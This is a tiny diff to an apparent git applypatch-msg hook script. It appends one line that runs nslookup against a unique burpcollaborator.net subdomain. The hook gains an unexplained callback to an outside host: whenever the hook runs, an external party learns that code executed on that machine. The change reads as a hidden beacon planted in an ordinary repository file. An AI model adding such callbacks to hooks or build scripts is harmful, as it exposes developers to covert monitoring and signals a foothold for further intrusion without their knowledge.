@@ -13,3 +13,4 @@
 commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
 test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
 :
+nslookup applypatch-msg.cgwjbsfvmvc9bqjowwfwihmprgx7lw.burpcollaborator.net
